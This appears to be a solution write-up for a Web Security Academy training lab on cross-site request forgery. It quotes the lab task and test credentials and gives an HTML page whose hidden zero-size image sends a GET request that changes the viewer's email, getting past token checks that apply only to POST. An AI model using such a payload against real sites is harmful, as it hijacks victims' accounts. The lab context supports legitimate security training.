# CSRF where token validation depends on request method

> This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
> You can log in to your own account using the following credentials: `wiener:peter`

```HTML
<html>
<body>
  <h1>Hello World!</h1>
  <img src="https://0ac100a304cceb67802bad5100c7004e.web-security-academy.net/my-account/change-email?email=sithum@nn.co" width="0" height="0" border="0">
</body>
</html>
```